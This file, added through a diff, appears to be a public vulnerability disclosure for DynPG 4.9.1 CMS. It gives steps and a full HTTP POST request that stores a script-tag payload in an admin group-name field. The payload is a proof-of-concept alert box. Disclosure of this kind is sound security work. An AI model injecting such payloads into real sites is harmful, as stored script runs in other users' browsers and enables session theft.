@@ -1,0 +1,53 @@
+# Exploit Title: DynPG 4.9.1 - Persistent Cross-Site Scripting (Authenticated)
+# Date: 2020-10-09
+# Exploit Author: Enes Özeser
+# Vendor Homepage: https://dynpg.org/
+# Version: 4.9.1
+# Tested on: Windows & XAMPP
+
+==> Tutorial <==
+
+1- Login to admin panel.
+2- Click on the "Texts" button.
+3- Write XSS payload into the Groupname. 
+4- Press "Create" button.
+
+XSS Payload ==> <script>alert("XSS");</script> 
+
+==> HTTP Request <==
+
+POST /index.php?show=4 HTTP/1.1
+Host: (HOST)
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------342819783638885794661955465553
+Content-Length: 725
+Origin: http://(HOST)
+Connection: close
+Referer: http://(HOST)/index.php?show=4
+Cookie: PHPSESSID=bsbas234jfvvdasdasd1i
+Upgrade-Insecure-Requests: 1
+
+-----------------------------342819783638885794661955465553
+Content-Disposition: form-data; name="NEW_GROUP_NAME"
+
+<script>alert("XSS");</script>
+-----------------------------342819783638885794661955465553
+Content-Disposition: form-data; name="GROUP_ID"
+
+0
+-----------------------------342819783638885794661955465553
+Content-Disposition: form-data; name="GRP_SUBMIT"
+
+Create
+-----------------------------342819783638885794661955465553
+Content-Disposition: form-data; name="GRP_ACTION"
+
+new_grp
+-----------------------------342819783638885794661955465553
+Content-Disposition: form-data; name="dpg_csrf_token"
+
+3F16478C29BED20AA73F1D25CB23F471
+-----------------------------342819783638885794661955465553--
